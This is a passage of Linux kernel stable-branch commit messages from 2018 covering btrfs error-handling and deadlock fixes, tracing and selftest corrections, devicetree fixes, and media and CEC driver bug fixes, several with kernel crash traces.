commit cdecd48a5546dfff26d8a697de00ab99e8c20c11
Author: Jeff Mahoney
Date: Thu Sep 6 16:59:33 2018 -0400
btrfs: fix error handling in free\_log\_tree
commit 374b0e2d6ba5da7fd1cadb3247731ff27d011f6f upstream.
When we hit an I/O error in free\_log\_tree->walk\_log\_tree during file system
shutdown we can crash due to there not being a valid transaction handle.
Use btrfs\_handle\_fs\_error when there's no transaction handle to use.
BUG: unable to handle kernel NULL pointer dereference at 0000000000000060
IP: free\_log\_tree+0xd2/0x140 [btrfs]
PGD 0 P4D 0
Oops: 0000 [#1] SMP DEBUG\_PAGEALLOC PTI
Modules linked in:
CPU: 2 PID: 23544 Comm: umount Tainted: G W 4.12.14-kvmsmall #9 SLE15 (unreleased)
Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.0.0-prebuilt.qemu-project.org 04/01/2014
task: ffff96bfd3478880 task.stack: ffffa7cf40d78000
RIP: 0010:free\_log\_tree+0xd2/0x140 [btrfs]
RSP: 0018:ffffa7cf40d7bd10 EFLAGS: 00010282
RAX: 00000000fffffffb RBX: 00000000fffffffb RCX: 0000000000000002
RDX: 0000000000000000 RSI: ffff96c02f07d4c8 RDI: 0000000000000282
RBP: ffff96c013cf1000 R08: ffff96c02f07d4c8 R09: ffff96c02f07d4d0
R10: 0000000000000000 R11: 0000000000000002 R12: 0000000000000000
R13: ffff96c005e800c0 R14: ffffa7cf40d7bdb8 R15: 0000000000000000
FS: 00007f17856bcfc0(0000) GS:ffff96c03f600000(0000) knlGS:0000000000000000
CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 0000000000000060 CR3: 0000000045ed6002 CR4: 00000000003606e0
DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
Call Trace:
? wait\_for\_writer+0xb0/0xb0 [btrfs]
btrfs\_free\_log+0x17/0x30 [btrfs]
btrfs\_drop\_and\_free\_fs\_root+0x9a/0xe0 [btrfs]
btrfs\_free\_fs\_roots+0xc0/0x130 [btrfs]
? wait\_for\_completion+0xf2/0x100
close\_ctree+0xea/0x2e0 [btrfs]
? kthread\_stop+0x161/0x260
generic\_shutdown\_super+0x6c/0x120
kill\_anon\_super+0xe/0x20
btrfs\_kill\_super+0x13/0x100 [btrfs]
deactivate\_locked\_super+0x3f/0x70
cleanup\_mnt+0x3b/0x70
task\_work\_run+0x78/0x90
exit\_to\_usermode\_loop+0x77/0xa6
do\_syscall\_64+0x1c5/0x1e0
entry\_SYSCALL\_64\_after\_hwframe+0x42/0xb7
RIP: 0033:0x7f1784f90827
RSP: 002b:00007ffdeeb03118 EFLAGS: 00000246 ORIG\_RAX: 00000000000000a6
RAX: 0000000000000000 RBX: 0000556a60c62970 RCX: 00007f1784f90827
RDX: 0000000000000001 RSI: 0000000000000000 RDI: 0000556a60c62b50
RBP: 0000000000000000 R08: 0000000000000005 R09: 00000000ffffffff
R10: 0000556a60c63900 R11: 0000000000000246 R12: 0000556a60c62b50
R13: 00007f17854a81c4 R14: 0000000000000000 R15: 0000000000000000
RIP: free\_log\_tree+0xd2/0x140 [btrfs] RSP: ffffa7cf40d7bd10
CR2: 0000000000000060
Fixes: 681ae50917df9 ("Btrfs: cleanup reserved space when freeing tree log on error")
CC:  # v3.13
Signed-off-by: Jeff Mahoney
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit d4f56c440d9e42c17e99f60894047ac64226aa99
Author: Qu Wenruo
Date: Tue Aug 21 09:53:47 2018 +0800
btrfs: locking: Add extra check in btrfs\_init\_new\_buffer() to avoid deadlock
commit b72c3aba09a53fc7c1824250d71180ca154517a7 upstream.
[BUG]
For certain crafted image, whose csum root leaf has missing backref, if
we try to trigger write with data csum, it could cause deadlock with the
following kernel WARN\_ON():
WARNING: CPU: 1 PID: 41 at fs/btrfs/locking.c:230 btrfs\_tree\_lock+0x3e2/0x400
CPU: 1 PID: 41 Comm: kworker/u4:1 Not tainted 4.18.0-rc1+ #8
Workqueue: btrfs-endio-write btrfs\_endio\_write\_helper
RIP: 0010:btrfs\_tree\_lock+0x3e2/0x400
Call Trace:
btrfs\_alloc\_tree\_block+0x39f/0x770
\_\_btrfs\_cow\_block+0x285/0x9e0
btrfs\_cow\_block+0x191/0x2e0
btrfs\_search\_slot+0x492/0x1160
btrfs\_lookup\_csum+0xec/0x280
btrfs\_csum\_file\_blocks+0x2be/0xa60
add\_pending\_csums+0xaf/0xf0
btrfs\_finish\_ordered\_io+0x74b/0xc90
finish\_ordered\_fn+0x15/0x20
normal\_work\_helper+0xf6/0x500
btrfs\_endio\_write\_helper+0x12/0x20
process\_one\_work+0x302/0x770
worker\_thread+0x81/0x6d0
kthread+0x180/0x1d0
ret\_from\_fork+0x35/0x40
[CAUSE]
That crafted image has missing backref for csum tree root leaf. And
when we try to allocate new tree block, since there is no
EXTENT/METADATA\_ITEM for csum tree root, btrfs consider it's free slot
and use it.
The extent tree of the image looks like:
Normal image | This fuzzed image
----------------------------------+--------------------------------
BG 29360128 | BG 29360128
One empty slot | One empty slot
29364224: backref to UUID tree | 29364224: backref to UUID tree
Two empty slots | Two empty slots
29376512: backref to CSUM tree | One empty slot (bad type) <<<
29380608: backref to D\_RELOC tree | 29380608: backref to D\_RELOC tree
... | ...
Since bytenr 29376512 has no METADATA/EXTENT\_ITEM, when btrfs try to
alloc tree block, it's an valid slot for btrfs.
And for finish\_ordered\_write, when we need to insert csum, we try to CoW
csum tree root.
By accident, empty slots at bytenr BG\_OFFSET, BG\_OFFSET + 8K,
BG\_OFFSET + 12K is already used by tree block COW for other trees, the
next empty slot is BG\_OFFSET + 16K, which should be the backref for CSUM
tree.
But due to the bad type, btrfs can recognize it and still consider it as
an empty slot, and will try to use it for csum tree CoW.
Then in the following call trace, we will try to lock the new tree
block, which turns out to be the old csum tree root which is already
locked:
btrfs\_search\_slot() called on csum tree root, which is at 29376512
|- btrfs\_cow\_block()
|- btrfs\_set\_lock\_block()
| |- Now locks tree block 29376512 (old csum tree root)
|- \_\_btrfs\_cow\_block()
|- btrfs\_alloc\_tree\_block()
|- btrfs\_reserve\_extent()
| Now it returns tree block 29376512, which extent tree
| shows its empty slot, but it's already hold by csum tree
|- btrfs\_init\_new\_buffer()
|- btrfs\_tree\_lock()
| Triggers WARN\_ON(eb->lock\_owner == current->pid)
|- wait\_event()
Wait lock owner to release the lock, but it's
locked by ourself, so it will deadlock
[FIX]
This patch will do the lock\_owner and current->pid check at
btrfs\_init\_new\_buffer().
So above deadlock can be avoided.
Since such problem can only happen in crafted image, we will still
trigger kernel warning for later aborted transaction, but with a little
more meaningful warning message.
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=200405
Reported-by: Xu Wen
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 4f2a4e02e2b17ffd90ad4bc0e12c97b20c0e67ed
Author: Qu Wenruo
Date: Tue Aug 21 09:42:03 2018 +0800
btrfs: Handle owner mismatch gracefully when walking up tree
commit 65c6e82becec33731f48786e5a30f98662c86b16 upstream.
[BUG]
When mounting certain crafted image, btrfs will trigger kernel BUG\_ON()
when trying to recover balance:
kernel BUG at fs/btrfs/extent-tree.c:8956!
invalid opcode: 0000 [#1] PREEMPT SMP NOPTI
CPU: 1 PID: 662 Comm: mount Not tainted 4.18.0-rc1-custom+ #10
RIP: 0010:walk\_up\_proc+0x336/0x480 [btrfs]
RSP: 0018:ffffb53540c9b890 EFLAGS: 00010202
Call Trace:
walk\_up\_tree+0x172/0x1f0 [btrfs]
btrfs\_drop\_snapshot+0x3a4/0x830 [btrfs]
merge\_reloc\_roots+0xe1/0x1d0 [btrfs]
btrfs\_recover\_relocation+0x3ea/0x420 [btrfs]
open\_ctree+0x1af3/0x1dd0 [btrfs]
btrfs\_mount\_root+0x66b/0x740 [btrfs]
mount\_fs+0x3b/0x16a
vfs\_kern\_mount.part.9+0x54/0x140
btrfs\_mount+0x16d/0x890 [btrfs]
mount\_fs+0x3b/0x16a
vfs\_kern\_mount.part.9+0x54/0x140
do\_mount+0x1fd/0xda0
ksys\_mount+0xba/0xd0
\_\_x64\_sys\_mount+0x21/0x30
do\_syscall\_64+0x60/0x210
entry\_SYSCALL\_64\_after\_hwframe+0x49/0xbe
[CAUSE]
Extent tree corruption. In this particular case, reloc tree root's
owner is DATA\_RELOC\_TREE (should be TREE\_RELOC), thus its backref is
corrupted and we failed the owner check in walk\_up\_tree().
[FIX]
It's pretty hard to take care of every extent tree corruption, but at
least we can remove such BUG\_ON() and exit more gracefully.
And since in this particular image, DATA\_RELOC\_TREE and TREE\_RELOC share
the same root (which is obviously invalid), we needs to make
\_\_del\_reloc\_root() more robust to detect such invalid sharing to avoid
possible NULL dereference as root->node can be NULL in this case.
Link: https://bugzilla.kernel.org/show\_bug.cgi?id=200411
Reported-by: Xu Wen
CC: stable@vger.kernel.org # 4.4+
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit c25c6665f33b7b8293064bea645bd9e2ead9e511
Author: Qu Wenruo
Date: Tue Oct 9 14:36:45 2018 +0800
btrfs: qgroup: Avoid calling qgroup functions if qgroup is not enabled
commit 3628b4ca64f24a4ec55055597d0cb1c814729f8b upstream.
Some qgroup trace events like btrfs\_qgroup\_release\_data() and
btrfs\_qgroup\_free\_delayed\_ref() can still be triggered even if qgroup is
not enabled.
This is caused by the lack of qgroup status check before calling some
qgroup functions. Thankfully the functions can handle quota disabled
case well and just do nothing for qgroup disabled case.
This patch will do earlier check before triggering related trace events.
And for enabled <-> disabled race case:
1) For enabled->disabled case
Disable will wipe out all qgroups data including reservation and
excl/rfer. Even if we leak some reservation or numbers, it will
still be cleared, so nothing will go wrong.
2) For disabled -> enabled case
Current btrfs\_qgroup\_release\_data() will use extent\_io tree to ensure
we won't underflow reservation. And for delayed\_ref we use
head->qgroup\_reserved to record the reserved space, so in that case
head->qgroup\_reserved should be 0 and we won't underflow.
CC: stable@vger.kernel.org # 4.14+
Reported-by: Chris Murphy
Link: https://lore.kernel.org/linux-btrfs/CAJCQCtQau7DtuUUeycCkZ36qjbKuxNzsgqJ7+sJ6W0dK\_NLE3w@mail.gmail.com/
Signed-off-by: Qu Wenruo
Reviewed-by: David Sterba
Signed-off-by: David Sterba
Signed-off-by: Greg Kroah-Hartman
commit 2b3171ec5ae0471bdef9dc1141b3ed8dd94c8532
Author: Masami Hiramatsu
Date: Mon Oct 22 00:08:20 2018 +0900
tracing: Return -ENOENT if there is no target synthetic event
commit 18858511fd8a877303cc34c06efa461b26a0e070 upstream.
Return -ENOENT error if there is no target synthetic event.
This notices an operation failure to user as below;
# echo 'wakeup\_latency u64 lat; pid\_t pid;' > synthetic\_events
# echo '!wakeup' >> synthetic\_events
sh: write error: No such file or directory
Link: http://lkml.kernel.org/r/154013449986.25576.9487131386597290172.stgit@devbox
Acked-by: Tom Zanussi
Tested-by: Tom Zanussi
Cc: Shuah Khan
Cc: Rajvi Jingar
Cc: stable@vger.kernel.org
Fixes: 4b147936fa50 ('tracing: Add support for 'synthetic' events')
Signed-off-by: Masami Hiramatsu
Signed-off-by: Steven Rostedt (VMware)
Signed-off-by: Greg Kroah-Hartman
commit 1ebadf5ef7f51b924d4f11863c495107ccbc6827
Author: Breno Leitao
Date: Mon Oct 22 18:16:26 2018 -0300
selftests/powerpc: Fix ptrace tm failure
commit 48dc0ef19044bfb69193302fbe3a834e3331b7ae upstream.
Test ptrace-tm-spd-gpr fails on current kernel (4.19) due to a segmentation
fault that happens on the child process prior to setting cptr[2] = 1. This
causes the parent process to wait forever at 'while (!pptr[2])' and the test to
be killed by the test harness framework by timeout, thus, failing.
The segmentation fault happens because of a inline assembly being
generated as:
0x10000355c  lfs f0, 0(0)
This is reading memory position 0x0 and causing the segmentation fault.
This code is being generated by ASM\_LOAD\_FPR\_SINGLE\_PRECISION(flt\_4), where
flt\_4 is passed to the inline assembly block as:
[flt\_4] "r" (&d)
Since the inline assembly 'r' constraint means any GPR, gpr0 is being
chosen, thus causing this issue when issuing a Load Floating-Point Single
instruction.
This patch simply changes the constraint to 'b', which specify that this
register will be used as base, and r0 is not allowed to be used, avoiding
this issue.
Other than that, removing flt\_2 register from the input operands, since it
is not used by the inline assembly code at all.
Cc: stable@vger.kernel.org
Signed-off-by: Breno Leitao
Acked-by: Segher Boessenkool
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit 2dc12479fbcaf6bba2d1fe0edd84ac5c0f4c1e08
Author: Masami Hiramatsu
Date: Mon Oct 22 00:08:48 2018 +0900
selftests/ftrace: Fix synthetic event test to delete event correctly
commit 0d0352d8b3d6d7ca9a710b40e194cbbaeb841c88 upstream.
Fix the synthetic event test case to remove event correctly.
If redirecting command to synthetic\_event file without append
mode, it cleans up all existing events and execute (parse) the
command. This means "delete event" always fails to find the
target event.
Since previous synthetic event has a bug which doesn't return
-ENOENT even if it fails to find the deleting event, this test
passed. But fixing that bug, this test fails because this test
itself has a bug.
This fixes that bug by trying to delete event right after
adding an event, and use append mode redirection ('>>') instead
of normal redirection ('>').
Link: http://lkml.kernel.org/r/154013452832.25576.2305459545429386517.stgit@devbox
Acked-by: Shuah Khan
Acked-by: Tom Zanussi
Tested-by: Tom Zanussi
Cc: Tom Zanussi
Cc: Tom Zanussi
Cc: Rajvi Jingar
Cc: Shuah Khan
Cc: stable@vger.kernel.org
Fixes: f06eec4d0f2c ('selftests: ftrace: Add inter-event hist triggers testcases')
Signed-off-by: Masami Hiramatsu
Signed-off-by: Steven Rostedt (VMware)
Signed-off-by: Greg Kroah-Hartman
commit b4087c2a327530028c9b4b0fc1e7ea98f30027a0
Author: Johan Hovold
Date: Wed Nov 15 10:44:58 2017 +0100
soc/tegra: pmc: Fix child-node lookup
commit 1dc6bd5e39a29453bdcc17348dd2a89f1aa4004e upstream.
Fix child-node lookup during probe, which ended up searching the whole
device tree depth-first starting at the parent rather than just matching
on its children.
To make things worse, the parent pmc node could end up being prematurely
freed as of\_find\_node\_by\_name() drops a reference to its first argument.
Fixes: 3568df3d31d6 ("soc: tegra: Add thermal reset (thermtrip) support to PMC")
Cc: stable  # 4.0
Cc: Mikko Perttunen
Signed-off-by: Johan Hovold
Reviewed-by: Mikko Perttunen
Signed-off-by: Thierry Reding
Signed-off-by: Greg Kroah-Hartman
commit 7f9a150f91b668c6bab1af0c60e6bfada46de388
Author: Bjorn Andersson
Date: Mon Aug 27 22:05:48 2018 -0700
soc: qcom: rmtfs-mem: Validate that scm is available
commit 137dc5843faeacabf48fc22a8dc58c4e0b4f0927 upstream.
The scm device must be present in order for the rmtfs driver to
configure memory permissions for the rmtfs memory region, so check that
it is probed before continuing.
Cc: stable@vger.kernel.org
Fixes: fa65f8045137 ("soc: qcom: rmtfs-mem: Add support for assigning memory to remote")
Signed-off-by: Bjorn Andersson
Signed-off-by: Andy Gross
Signed-off-by: Greg Kroah-Hartman
commit 142261e7b90849a5bdc039d71ae4401ee26fe13e
Author: Thor Thayer
Date: Tue Sep 25 10:31:52 2018 -0500
arm64: dts: stratix10: Correct System Manager register size
commit 74121b9aa3cd571ddfff014a9f47db36cae3cda9 upstream.
Correct the register size of the System Manager node.
Cc: stable@vger.kernel.org
Fixes: 78cd6a9d8e154 ("arm64: dts: Add base stratix 10 dtsi")
Signed-off-by: Thor Thayer
Signed-off-by: Dinh Nguyen
Signed-off-by: Greg Kroah-Hartman
commit 9a209614d42caff106357122e640ba437bad74f8
Author: Thor Thayer
Date: Tue Sep 25 10:21:10 2018 -0500
ARM: dts: socfpga: Fix SDRAM node address for Arria10
commit ce3bf934f919a7d675c5b7fa4cc233ded9c6256e upstream.
The address in the SDRAM node was incorrect. Fix this to agree with the
correct address and to match the reg definition block.
Cc: stable@vger.kernel.org
Fixes: 54b4a8f57848b("arm: socfpga: dts: Add Arria10 SDRAM EDAC DTS support")
Signed-off-by: Thor Thayer
Signed-off-by: Dinh Nguyen
Signed-off-by: Greg Kroah-Hartman
commit 9d9da6fe1f018669a0abd9d94f3810de5798a161
Author: Nicolas Pitre
Date: Tue Oct 30 13:26:15 2018 -0400
Cramfs: fix abad comparison when wrap-arounds occur
commit 672ca9dd13f1aca0c17516f76fc5b0e8344b3e46 upstream.
It is possible for corrupted filesystem images to produce very large
block offsets that may wrap when a length is added, and wrongly pass
the buffer size test.
Reported-by: Anatoly Trosinenko
Signed-off-by: Nicolas Pitre
Cc: stable@vger.kernel.org
Signed-off-by: Greg Kroah-Hartman
commit 9632c0339b1217e280f693161498c3152c9c7bb3
Author: Colin Ian King
Date: Thu Sep 27 22:36:27 2018 +0100
rpmsg: smd: fix memory leak on channel create
commit 940c620d6af8fca7d115de40f19870fba415efac upstream.
Currently a failed allocation of channel->name leads to an
immediate return without freeing channel. Fix this by setting
ret to -ENOMEM and jumping to an exit path that kfree's channel.
Detected by CoverityScan, CID#1473692 ("Resource Leak")
Fixes: 53e2822e56c7 ("rpmsg: Introduce Qualcomm SMD backend")
Cc: stable@vger.kernel.org
Signed-off-by: Colin Ian King
Signed-off-by: Bjorn Andersson
Signed-off-by: Greg Kroah-Hartman
commit 64537fda9a6aad48ed26601026e1d5f2efdc95c4
Author: Tri Vo
Date: Wed Sep 19 12:27:50 2018 -0700
arm64: lse: remove -fcall-used-x0 flag
commit 2a6c7c367de82951c98a290a21156770f6f82c84 upstream.
x0 is not callee-saved in the PCS. So there is no need to specify
-fcall-used-x0.
Clang doesn't currently support -fcall-used flags. This patch will help
building the kernel with clang.
Tested-by: Nick Desaulniers
Acked-by: Will Deacon
Signed-off-by: Tri Vo
Signed-off-by: Catalin Marinas
Signed-off-by: Greg Kroah-Hartman
commit 3f7987f818e86d660d5bbef1aa5a74294014464d
Author: Hans Verkuil
Date: Thu Sep 13 07:47:29 2018 -0400
media: hdmi.h: rename ADOBE\_RGB to OPRGB and ADOBE\_YCC to OPYCC
commit 463659a08d7999d5461fa45b35b17686189a70ca upstream.
These names have been renamed in the CTA-861 standard due to trademark
issues. Replace them here as well so they are in sync with the standard.
Signed-off-by: Hans Verkuil
Cc: stable@vger.kernel.org
Acked-by: Daniel Vetter
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit b1452c51f42a29f429a0af620af6153a561c583b
Author: Hans Verkuil
Date: Fri Sep 14 04:58:03 2018 -0400
media: replace ADOBERGB by OPRGB
commit db0340182444612bcadb98bdec22f651aa42266c upstream.
The CTA-861 standards have been updated to refer to opRGB instead
of AdobeRGB. The official standard is in fact named opRGB, so
switch to that.
The two old defines referring to ADOBERGB in the public API are
put under #ifndef \_\_KERNEL\_\_ and a comment mentions that they are
deprecated.
Signed-off-by: Hans Verkuil
Cc: stable@vger.kernel.org
Acked-by: Daniel Vetter
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 29ba4b99ca18b1de4611555de8b001c6f9dd24eb
Author: Hans Verkuil
Date: Thu Sep 13 07:47:28 2018 -0400
media: media colorspaces\*.rst: rename AdobeRGB to opRGB
commit a58c37978cf02f6d35d05ee4e9288cb8455f1401 upstream.
Drop all Adobe references and use the official opRGB standard
instead.
Signed-off-by: Hans Verkuil
Cc: stable@vger.kernel.org
Acked-by: Daniel Vetter
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 5501b81206ed02d36f38c503ba9212aa4a75e437
Author: Johan Hovold
Date: Mon Aug 27 10:21:46 2018 +0200
drm/mediatek: fix OF sibling-node lookup
commit ceff2f4dcd44abf35864d9a99f85ac619e89a01d upstream.
Use the new of\_get\_compatible\_child() helper to lookup the sibling
instead of using of\_find\_compatible\_node(), which searches the entire
tree from a given start node and thus can return an unrelated (i.e.
non-sibling) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the parent device node).
While at it, also fix the related cec-node reference leak.
Fixes: 8f83f26891e1 ("drm/mediatek: Add HDMI support")
Cc: stable  # 4.8
Cc: Junzhi Zhao
Cc: Philipp Zabel
Cc: CK Hu
Cc: David Airlie
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit 6529dcce7920c1ac69c124c92147db2d4f73136e
Author: Hans Verkuil
Date: Thu Oct 4 03:58:34 2018 -0400
media: adv7842: when the EDID is cleared, unconfigure CEC as well
commit ab83203e181015b099720aff43ffabc1812e0fb3 upstream.
When there is no EDID the CEC adapter should be unconfigured as
well. So call cec\_phys\_addr\_invalidate() when this happens.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 3e383b31b30327db3b76d9546fdbf8d0c3880a0f
Author: Hans Verkuil
Date: Thu Oct 4 03:57:06 2018 -0400
media: adv7604: when the EDID is cleared, unconfigure CEC as well
commit e7da89926f6dc6cf855f5ffdf79ef99a1b115ca7 upstream.
When there is no EDID the CEC adapter should be unconfigured as
well. So call cec\_phys\_addr\_invalidate() when this happens.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 9a79eb1233e27933b351973473311f42b41e4de3
Author: Mauro Carvalho Chehab
Date: Fri Sep 14 13:13:15 2018 -0400
media: em28xx: fix handler for vidioc\_s\_input()
commit 258c430456ba5f0005043762e14fc3be35983aaf upstream.
The a->index is not the name of the internal amux entry,
but, instead a value from zero to the maximum number
of audio inputs.
As the actual available inputs depend on each board, build
it dynamically.
This is broken for a really long time. On a quick check,
since at least commit 195a4ef627e1 ("V4L/DVB (6585): Convert
em28xx to video\_ioctl2") this was not implemented right.
Fixes: 195a4ef627e1 ("V4L/DVB (6585): Convert em28xx to video\_ioctl2")
Cc: stable@vger.kernel.org
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 3e2e4d05b50b5033df9d6bc7527c3fe2566f3884
Author: Mauro Carvalho Chehab
Date: Thu Sep 13 22:46:29 2018 -0400
media: em28xx: make v4l2-compliance happier by starting sequence on zero
commit afeaade90db4c5dab93f326d9582be1d5954a198 upstream.
The v4l2-compliance tool complains if a video doesn't start
with a zero sequence number.
While this shouldn't cause any real problem for apps, let's
make it happier, in order to better check the v4l2-compliance
differences before and after patchsets.
This is actually an old issue. It is there since at least its
videobuf2 conversion, e. g. changeset 3829fadc461 ("[media]
em28xx: convert to videobuf2"), if VB1 wouldn't suffer from
the same issue.
Cc: stable@vger.kernel.org
Fixes: d3829fadc461 ("[media] em28xx: convert to videobuf2")
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit d861ec5dfe0cfda7147b1a70df0ed6b19e794c6a
Author: Mauro Carvalho Chehab
Date: Fri Sep 14 00:20:21 2018 -0400
media: em28xx: fix input name for Terratec AV 350
commit 15644bfa195bd166d0a5ed76ae2d587f719c3dac upstream.
Instead of using a register value, use an AMUX name, as otherwise
VIDIOC\_G\_AUDIO would fail.
Cc: stable@vger.kernel.org
Fixes: 766ed64de554 ("V4L/DVB (11827): Add support for Terratec Grabster AV350")
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 73dc88fa1c68b12c5d31b28e3e49b995fce7b6a2
Author: Mauro Carvalho Chehab
Date: Thu Sep 13 16:49:51 2018 -0400
media: tvp5150: avoid going past array on v4l2\_querymenu()
commit 5c4c4505b716cb782ad7263091edc466c4d1fbd4 upstream.
The parameters of v4l2\_ctrl\_new\_std\_menu\_items() are tricky: instead of
the number of possible values, it requires the number of the maximum
value. In other words, the ARRAY\_SIZE() value should be decremented,
otherwise it will go past the array bounds, as warned by KASAN:
[ 279.839688] BUG: KASAN: global-out-of-bounds in v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839709] Read of size 8 at addr ffffffffc10a4cb0 by task v4l2-compliance/16676
[ 279.839736] CPU: 1 PID: 16676 Comm: v4l2-compliance Not tainted 4.18.0-rc2+ #120
[ 279.839741] Hardware name: /NUC5i7RYB, BIOS RYBDWi35.86A.0364.2017.0511.0949 05/11/2017
[ 279.839743] Call Trace:
[ 279.839758] dump\_stack+0x71/0xab
[ 279.839807] ? v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839817] print\_address\_description+0x1c9/0x270
[ 279.839863] ? v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839871] kasan\_report+0x237/0x360
[ 279.839918] v4l2\_querymenu+0x10d/0x180 [videodev]
[ 279.839964] \_\_video\_do\_ioctl+0x2c8/0x590 [videodev]
[ 279.840011] ? copy\_overflow+0x20/0x20 [videodev]
[ 279.840020] ? avc\_ss\_reset+0xa0/0xa0
[ 279.840028] ? check\_stack\_object+0x21/0x60
[ 279.840036] ? \_\_check\_object\_size+0xe7/0x240
[ 279.840080] video\_usercopy+0xed/0x730 [videodev]
[ 279.840123] ? copy\_overflow+0x20/0x20 [videodev]
[ 279.840167] ? v4l\_enumstd+0x40/0x40 [videodev]
[ 279.840177] ? \_\_handle\_mm\_fault+0x9f9/0x1ba0
[ 279.840186] ? \_\_pmd\_alloc+0x2c0/0x2c0
[ 279.840193] ? \_\_vfs\_write+0xb6/0x350
[ 279.840200] ? kernel\_read+0xa0/0xa0
[ 279.840244] ? video\_usercopy+0x730/0x730 [videodev]
[ 279.840284] v4l2\_ioctl+0xa1/0xb0 [videodev]
[ 279.840295] do\_vfs\_ioctl+0x117/0x8a0
[ 279.840303] ? selinux\_file\_ioctl+0x211/0x2f0
[ 279.840313] ? ioctl\_preallocate+0x120/0x120
[ 279.840319] ? selinux\_capable+0x20/0x20
[ 279.840332] ksys\_ioctl+0x70/0x80
[ 279.840342] \_\_x64\_sys\_ioctl+0x3d/0x50
[ 279.840351] do\_syscall\_64+0x6d/0x1c0
[ 279.840361] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 279.840367] RIP: 0033:0x7fdfb46275d7
[ 279.840369] Code: b3 66 90 48 8b 05 b1 48 2d 00 64 c7 00 26 00 00 00 48 c7 c0 ff ff ff ff c3 66 2e 0f 1f 84 00 00 00 00 00 b8 10 00 00 00 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 81 48 2d 00 f7 d8 64 89 01 48
[ 279.840474] RSP: 002b:00007ffee1179038 EFLAGS: 00000202 ORIG\_RAX: 0000000000000010
[ 279.840483] RAX: ffffffffffffffda RBX: 00007ffee1179180 RCX: 00007fdfb46275d7
[ 279.840488] RDX: 00007ffee11790c0 RSI: 00000000c02c5625 RDI: 0000000000000003
[ 279.840493] RBP: 0000000000000002 R08: 0000000000000020 R09: 00000000009f0902
[ 279.840497] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffee117a5a0
[ 279.840501] R13: 00007ffee11790c0 R14: 0000000000000002 R15: 0000000000000000
[ 279.840515] The buggy address belongs to the variable:
[ 279.840535] tvp5150\_test\_patterns+0x10/0xffffffffffffe360 [tvp5150]
Fixes: c43875f66140 ("[media] tvp5150: replace MEDIA\_ENT\_F\_CONN\_TEST by a control")
Cc: stable@vger.kernel.org
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit e015b50253610ffefca3b8f611e5ed4796a70c6c
Author: Mauro Carvalho Chehab
Date: Thu Sep 13 23:22:40 2018 -0400
media: em28xx: use a default format if TRY\_FMT fails
commit f823ce2a1202d47110a7ef86b65839f0be8adc38 upstream.
Follow the V4L2 spec, as warned by v4l2-compliance:
warn: v4l2-test-formats.cpp(732): TRY\_FMT cannot handle an invalid pixelformat.
warn: v4l2-test-formats.cpp(733): This may or may not be a problem. For more information see:
warn: v4l2-test-formats.cpp(734): http://www.mail-archive.com/linux-media@vger.kernel.org/msg56550.html
Cc: stable@vger.kernel.org
Fixes: bddcf63313c6 ("V4L/DVB (9927): em28xx: use a more standard way to specify video formats")
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 2781b86d7e45de09befa5ace296b66787146561f
Author: Hans Verkuil
Date: Mon Oct 15 06:14:22 2018 -0400
media: cec: forgot to cancel delayed work
commit 490d84f6d73c12f4204241cff8651eed60aae914 upstream.
If the wait for completion was interrupted, then make sure to cancel
any delayed work.
This can only happen if a transmit is waiting for a reply, and you press
Ctrl-C or reboot/poweroff or something like that which interrupts the
thread waiting for the reply and then proceeds to delete the CEC message.
Since the delayed work wasn't canceled, once it would trigger it referred
to stale data and resulted in a kernel oops.
Fixes: 7ec2b3b941a6 ("cec: add new tx/rx status bits to detect aborts/timeouts")
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit b68d405a2e6a3e8236773b12739ef684fb43d0e9
Author: Hans Verkuil
Date: Fri Oct 5 08:00:21 2018 -0400
media: cec: fix the Signal Free Time calculation
commit 7d867a1b765e2b70815fec4964d7822a976ed349 upstream.
The calculation of the Signal Free Time in the framework was not
correct. If a message was received, then the next transmit should be
considered a New Initiator and use a shorter SFT value.
This was not done with the result that if both sides where continually
sending messages, they both could use the same SFT value and one side
could deny the other side access to the bus.
Note that this fix does not take the corner case into account where
a receive is in progress when you call adap\_transmit.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 94ec4487af9f08d10270bd2ad5d6802a2a42d74f
